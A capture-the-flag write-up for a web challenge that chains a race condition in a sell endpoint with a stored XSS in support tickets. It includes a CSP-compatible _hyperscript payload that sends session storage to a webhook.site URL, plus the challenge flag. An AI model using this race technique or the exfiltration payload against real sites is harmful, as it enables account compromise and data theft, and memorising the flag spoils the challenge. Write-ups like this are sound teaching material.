# MineGamble

Target: `http://34.159.46.81:30114`

## Summary

The challenge has two bugs that chain cleanly:

1. A server-side race in `POST /api/sell` lets us duplicate sell credit and farm money until we can buy the `OWNER` rank.
2. The support ticket detail page reflects the ticket body as raw HTML. Its CSP allows scripts from `self` and `https://cdnjs.cloudflare.com`, and the page loads `/telemetry.js`, which exposes a useful exfiltration gadget: `flushCrashLogs()`.

After becoming `OWNER`, we can open Support, submit a stored XSS payload in the ticket body, and wait for the admin bot to render the ticket. The payload redirects telemetry data to our webhook, leaking the flag from session storage.

Flag:

```text
CTF{232d8f9f99d0a3e440297b4aee4774c2d2e75868c6ec85d585f8410404e56cd1}
```

## Recon

The SPA exposes these relevant endpoints:

- `POST /api/register`
- `POST /api/login`
- `GET /api/me`
- `GET /api/shop`
- `POST /api/shop/buy`
- `POST /api/sell`
- `POST /api/store/buy`
- `POST /api/ticket`
- `GET /api/tickets`
- `GET /ticket/:id`

The rank shop includes:

- `VIP` for `$15`
- `MVP` for `$50`
- `OWNER` for `$10000`

The client only shows the Support tab when `currentUser.rank === "OWNER"`.

## Part 1: Race to OWNER

The frontend has a UI lock around selling, but the backend does not serialize the operation correctly. Sending many concurrent `POST /api/sell` requests for the same item yields multiple successful payouts.

A reliable path was:

1. Register a fresh account.
2. Buy `Gold Ingot` (`itemId: 5`) once.
3. Send about 50 concurrent sell requests for item `5`.
4. Buy `Netherite Ingot` (`itemId: 8`) four times.
5. Send about 50 concurrent sell requests for item `8`.
6. Buy `OWNER` via `POST /api/store/buy`.

Example requests:

```http
POST /api/shop/buy
itemId=5&amount=1
```

```http
POST /api/sell
itemId=5
```

```http
POST /api/shop/buy
itemId=8&amount=4
```

```http
POST /api/sell
itemId=8
```

```http
POST /api/store/buy
rank=OWNER
```

In practice the balances looked like this:

- start: `$25`
- after racing `Gold Ingot`: about `$1125`
- after racing `Netherite Ingot`: about `$43325`
- after buying `OWNER`: still enough balance left, rank becomes `OWNER`

## Part 2: Find the XSS sink

Two support-related surfaces matter:

### `/api/tickets`

The SPA renders ticket subjects with `innerHTML`, which initially looks exploitable. But the backend HTML-escapes subjects before returning them, so this path is dead.

### `/ticket/:id`

This is the real sink.

Observed behavior:

- subject is escaped
- body is reflected as raw HTML
- CSP is:

```text
default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com;
```

The page also loads `/telemetry.js`, which defines:

```js
flushCrashLogs()
```

That function collects browser state including `document.cookie`, storage contents, URL, and page metadata, then redirects to:

- `window.crashReportSink`, if defined
- otherwise `/api/diagnostics/log`

That gives us a clean exfil primitive if we can execute script on the ticket page.

## Part 3: Bypass the ticket filter

The ticket submission endpoint has a lexical filter that blocks many Angular bootstrap strings such as:

- `ng-app`
- `data-ng-app`
- `x-ng-app`
- `ng-controller`
- `ng-init`

However, it allows:

- raw `<script src=...>` tags
- body HTML to be stored unchanged
- `_hyperscript` attributes like `_="init ..."`
- `cdnjs` scripts that match CSP

The easiest working path was to use `_hyperscript` from `cdnjs`.

Working payload:

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.14/_hyperscript.min.js"></script>
<div _="init set window.crashReportSink to 'https://webhook.site/YOUR-TOKEN' then call flushCrashLogs()"></div>
```

Why it works:

- the external script is allowed by CSP
- the filter does not block the `_` attribute / `init` syntax
- `_hyperscript` processes the DOM attribute and runs on page initialization
- `flushCrashLogs()` is already present on the page through `/telemetry.js`

## Part 4: Trigger admin bot and read webhook

Submit the ticket body above after becoming `OWNER`.

When the bot visits the ticket page, it requests the webhook with a `ctx` query parameter containing base64-encoded telemetry data.

The successful webhook hit came from the challenge host with a headless browser and included:

```json
{
  "storage": {
    "authSession": "flag=CTF{232d8f9f99d0a3e440297b4aee4774c2d2e75868c6ec85d585f8410404e56cd1}",
    "localKeys": [],
    "sessionKeys": []
  }
}
```

Extracting the value after `flag=` gives the final flag.

## Minimal Exploit Flow

1. Register a user.
2. Race `POST /api/sell` until you can buy `OWNER`.
3. Open Support.
4. Submit this ticket body:

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.14/_hyperscript.min.js"></script>
<div _="init set window.crashReportSink to 'https://webhook.site/YOUR-TOKEN' then call flushCrashLogs()"></div>
```

5. Poll the webhook.
6. Decode the exfiltrated telemetry and read `storage.authSession`.
7. Extract the flag.

## Notes

- The sell issue is backend-side; UI throttling does not matter if requests are sent concurrently.
- The ticket list is a red herring because the server escapes subjects.
- The ticket detail page is the real vulnerability because it stores and reflects raw HTML in the body.
- `_hyperscript` is the cleanest CSP-compatible execution path here because it avoids blocked Angular markers and does not need inline JavaScript.
